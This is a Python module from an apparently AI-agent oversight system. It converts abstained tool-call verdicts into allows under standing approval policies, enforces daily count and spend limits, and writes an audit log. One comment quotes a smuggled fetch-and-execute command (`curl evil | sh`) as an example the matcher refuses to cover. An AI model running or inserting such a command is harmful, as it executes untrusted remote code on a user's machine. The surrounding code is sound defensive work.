"""Standing approvals at the decision point: match, count, audit.

`apply` is called with the verdict `autoreview.evaluate` already reached, and
it only ever changes ONE verdict: `abstain` -- the deck holding no rule about
the call. Within an active policy with room left that becomes `allow`, and
the action is counted and written to the audit log. A policy that matches but
is used up today becomes `ask`, so the limit is a real ceiling and not a
suggestion the CLI's own engine could wave past. Everything else -- deny,
require-approval, the secure-handoff floor, a rule's allow -- passes through
untouched, and an action on `standing_floor` is never covered at all.

Days are America/New_York days: counters reset at midnight there.
"""

from __future__ import annotations

import json
import re
import threading
import time
from dataclasses import dataclass
from datetime import datetime
from fnmatch import fnmatchcase
from pathlib import Path
from typing import Protocol
from urllib.parse import urlparse
from zoneinfo import ZoneInfo

from . import asking, atomic, autoreview, standing_floor
from .paths import BUS_DIR
from .standing import Policy

DAY_TZ = ZoneInfo("America/New_York")
USAGE_PATH: Path = BUS_DIR / "standing-usage.json"
AUDIT_PATH: Path = BUS_DIR / "standing-audit.jsonl"

_LOCK = threading.Lock()


# ── what an action costs ────────────────────────────────────────────────────


class SpendSource(Protocol):
    """Where the dollar cost of an action comes from. None = not known."""

    def cost_usd(self, *, desk: str, tool_name: str, tool_input: dict,
                 payload: dict) -> float | None: ...


class DeclaredCost:
    """The desk declares it: `cost_usd` on the tool input, or on the hook
    payload beside it. No declaration is no cost known -- and a spend with no
    known cost is NOT covered: it raises the card."""

    def cost_usd(self, *, desk, tool_name, tool_input, payload):
        for source in (tool_input, payload):
            value = source.get("cost_usd") if isinstance(source, dict) else None
            if isinstance(value, (int, float)) and not isinstance(value, bool) \
                    and value >= 0:
                return float(value)
        return None


#: Asked in order; the first answer wins. The Money Board registers its
#: provider here (`register_spend_source`) without this module knowing it.
SPEND_SOURCES: list[SpendSource] = [DeclaredCost()]


def register_spend_source(source: SpendSource) -> None:
    SPEND_SOURCES.append(source)


def cost_of(*, desk: str, tool_name: str, tool_input: dict,
            payload: dict | None = None) -> float | None:
    for source in list(SPEND_SOURCES):
        try:
            cost = source.cost_usd(desk=desk, tool_name=tool_name,
                                   tool_input=tool_input, payload=payload or {})
        except Exception:  # a broken provider is an unknown cost, not a crash
            cost = None
        if cost is not None:
            return cost
    return None


# ── what an action is ───────────────────────────────────────────────────────

_SEND_MAIL = re.compile(r"(mail|gmail).*send|send.*(mail|email)")


def kinds_of(tool_name: str, cost: float | None) -> set[str]:
    low = tool_name.lower()
    out: set[str] = set()
    if tool_name == "Bash":
        out.add("run_command")
    if _SEND_MAIL.search(low):
        out.add("send_email")
    if "comment" in low:
        out.add("post_comment")
    if not out and (tool_name == "WebFetch" or low.startswith("mcp__")):
        out.add("call_api")
    if cost is not None:
        out.add("spend_money")
    return out


def _addresses(tool_input: dict) -> list[str]:
    found: list[str] = []
    for key in ("to", "cc", "bcc", "recipient", "recipients"):
        value = tool_input.get(key)
        items = value if isinstance(value, list) else [value]
        for item in items:
            if isinstance(item, str):
                found += [a.strip().lower() for a in re.split(r"[,;]", item)
                          if a.strip()]
    url = tool_input.get("url")
    if isinstance(url, str) and urlparse(url).hostname:
        found.append(urlparse(url).hostname.lower())
    return found


def _allowed(address: str, allow: tuple[str, ...]) -> bool:
    address = re.sub(r".*<([^>]+)>.*", r"\1", address)
    domain = address.rsplit("@", 1)[-1]
    for entry in allow:
        bare = entry.lstrip("@")
        if address == entry or domain == bare or domain.endswith("." + bare):
            return True
    return False


def _account(tool_input: dict) -> str:
    for key in ("from", "sender", "account", "user_id", "userId"):
        if isinstance(tool_input.get(key), str):
            return tool_input[key].strip().lower()
    return ""


def matches(policy: Policy, *, desk: str, tool_name: str, tool_input: dict,
            cwd: str, cost: float | None) -> bool:
    """Does this policy describe this action? PURE. Limits are not checked."""
    if not desk or policy.desk not in (desk, "*"):
        return False
    if policy.kind not in kinds_of(tool_name, cost):
        return False
    if not fnmatchcase(tool_name, policy.tool):
        return False
    if policy.usd_per_day is not None and cost is None:
        return False
    subject = autoreview.tool_subject(tool_name, tool_input)
    if tool_name == "Bash":
        # The "always" matcher, verbatim: every command in the line must be
        # one the pattern names, so `gh pr list; curl evil | sh` is not
        # covered by `gh pr*`.
        rule = autoreview.Rule(id=policy.id, kind=autoreview.ALWAYS_ALLOW,
                               tool="Bash", pattern=policy.pattern, cwd="/",
                               desk=desk)
        if autoreview.desk_covers([rule], desk=desk, tool_name="Bash",
                                  subject=subject, cwd=cwd or "/") is None:
            return False
    elif not fnmatchcase(subject, policy.pattern):
        return False
    if policy.recipients:
        found = _addresses(tool_input)
        if not found or not all(_allowed(a, policy.recipients) for a in found):
            return False
    if policy.account and _account(tool_input) != policy.account:
        return False
    return True


# ── counting ────────────────────────────────────────────────────────────────


def day_of(now: float) -> str:
    return datetime.fromtimestamp(now, DAY_TZ).date().isoformat()


def usage(path: Path = USAGE_PATH, now: float | None = None) -> dict:
    """`{policy_id: {"count": n, "usd": x}}` for today. A new day is empty."""
    now = time.time() if now is None else now
    try:
        raw = json.loads(Path(path).read_text())
    except (OSError, ValueError):
        return {}
    if not isinstance(raw, dict) or raw.get("day") != day_of(now):
        return {}
    used = raw.get("used")
    return used if isinstance(used, dict) else {}


def _room(policy: Policy, used: dict, cost: float | None) -> bool:
    row = used.get(policy.id) or {}
    if policy.count_per_day is not None and \
            int(row.get("count", 0)) + 1 > policy.count_per_day:
        return False
    if policy.usd_per_day is not None and \
            float(row.get("usd", 0)) + (cost or 0) > policy.usd_per_day + 1e-9:
        return False
    return True


@dataclass(frozen=True)
class Decision:
    policy: Policy
    state: str          # "covered" | "over_limit"


def decide(policies: list[Policy], used: dict, *, desk: str, tool_name: str,
           tool_input: dict, cwd: str, cost: float | None,
           now: float) -> Decision | None:
    """The policy that covers this action, or the used-up one that would."""
    if standing_floor.never_coverable(tool_name, tool_input) is not None:
        return None
    hits = [p for p in policies if p.live(now) and matches(
        p, desk=desk, tool_name=tool_name, tool_input=tool_input, cwd=cwd,
        cost=cost)]
    for policy in hits:
        if _room(policy, used, cost):
            return Decision(policy, "covered")
    return Decision(hits[0], "over_limit") if hits else None


def consume(policy: Policy, cost: float | None, *, desk: str, tool_name: str,
            subject: str, now: float, usage_path: Path = USAGE_PATH,
            audit_path: Path = AUDIT_PATH) -> dict | None:
    """Count one action against `policy`, or None if it has no room left.

    Re-checked under the lock: two calls racing for the 80th slot get one
    allow and one card, never 81.
    """
    with _LOCK:
        used = dict(usage(usage_path, now))
        if not _room(policy, used, cost):
            return None
        row = dict(used.get(policy.id) or {})
        row["count"] = int(row.get("count", 0)) + 1
        row["usd"] = round(float(row.get("usd", 0)) + (cost or 0), 6)
        used[policy.id] = row
        Path(usage_path).parent.mkdir(parents=True, exist_ok=True)
        atomic.write_text(Path(usage_path),
                          json.dumps({"day": day_of(now), "used": used}))
        line = {"ts": now, "desk": desk, "tool": tool_name,
                "action": asking.redact(subject)[:200], "kind": policy.kind,
                "policy_id": policy.id, "count_after": row["count"],
                "usd_after": row["usd"], "cost_usd": cost}
        with Path(audit_path).open("a") as fh:
            fh.write(json.dumps(line) + "\n")
    return row


def audit(path: Path = AUDIT_PATH, *, limit: int = 200, desk: str = "",
          policy_id: str = "") -> list[dict]:
    """The audit log, newest first."""
    try:
        lines = Path(path).read_text().splitlines()
    except OSError:
        return []
    out = []
    for line in reversed(lines):
        try:
            row = json.loads(line)
        except ValueError:
            continue
        if (desk and row.get("desk") != desk) or \
                (policy_id and row.get("policy_id") != policy_id):
            continue
        out.append(row)
        if len(out) >= limit:
            break
    return out


def _limit_text(policy: Policy, row: dict) -> str:
    parts = []
    if policy.count_per_day is not None:
        parts.append(f"{row.get('count', 0)}/{policy.count_per_day}")
    if policy.usd_per_day is not None:
        parts.append(f"${row.get('usd', 0):.2f}/${policy.usd_per_day:.2f}")
    return " ".join(parts) + " today"


def apply(verdict: autoreview.Verdict, *, policies: list[Policy], desk: str,
          tool_name: str, tool_input: dict, cwd: str,
          payload: dict | None = None, now: float | None = None,
          usage_path: Path = USAGE_PATH,
          audit_path: Path = AUDIT_PATH) -> autoreview.Verdict:
    """The verdict once standing approvals have had their say."""
    if verdict.decision != "abstain" or not policies:
        return verdict
    now = time.time() if now is None else now
    cost = cost_of(desk=desk, tool_name=tool_name, tool_input=tool_input,
                   payload=payload)
    found = decide(policies, usage(usage_path, now), desk=desk,
                   tool_name=tool_name, tool_input=tool_input, cwd=cwd,
                   cost=cost, now=now)
    if found is None:
        return verdict
    policy = found.policy
    row = None
    if found.state == "covered":
        row = consume(policy, cost, desk=desk, tool_name=tool_name,
                      subject=autoreview.tool_subject(tool_name, tool_input),
                      now=now, usage_path=usage_path, audit_path=audit_path)
    if row is None:
        used = usage(usage_path, now).get(policy.id) or {}
        return autoreview.Verdict(
            "ask", f"standing:{policy.id}",
            f"standing approval {policy.id} is used up "
            f"({_limit_text(policy, used)})")
    return autoreview.Verdict(
        "allow", f"standing:{policy.id}",
        f"standing approval {policy.id} ({_limit_text(policy, row)})")
